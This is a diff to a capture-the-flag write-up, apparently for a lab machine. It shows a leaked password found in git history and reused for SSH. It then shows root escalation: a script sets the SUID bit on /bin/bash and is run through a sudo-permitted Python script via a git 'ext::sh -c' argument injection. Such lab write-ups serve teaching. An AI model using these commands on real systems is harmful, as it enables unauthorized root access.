@@ -54,10 +54,31 @@ Get the user flag!
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/3ad2f8e3-b7e9-425b-8604-db6ca4fdcf5b)
 
+![image](https://github.com/zer00d4y/writeups/assets/128820441/c8fe42b2-ef4e-4ed7-a9f9-2211a53b491e)
 
+git show 1e84a036b2f33c59e2390730699a488c65643d28
 
+    ...
+    +        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+    ...
 
-![image](https://github.com/zer00d4y/writeups/assets/128820441/0bce9643-6634-4b79-8d16-13f1191b080e)
+SSH credentials for `Prod`
 
 `prod:080217_Producti0n_2023!@`
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/16e93836-bbc6-4331-a261-0026caa67669)
+
+    echo '#!/bin/bash' > /tmp/exploit.sh 
+    
+    echo 'chmod u+s /bin/bash' >> /tmp/exploit.sh  
+      
+    sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c '/tmp/exploit.sh'"  
+      
+    ls -l /bin/bash
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/74d0eb0e-1475-4172-abd1-3bea6ca23bac)
+
+Get the root flag!
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/c7c2778a-c835-49dd-9232-acb92554cb2f)
 
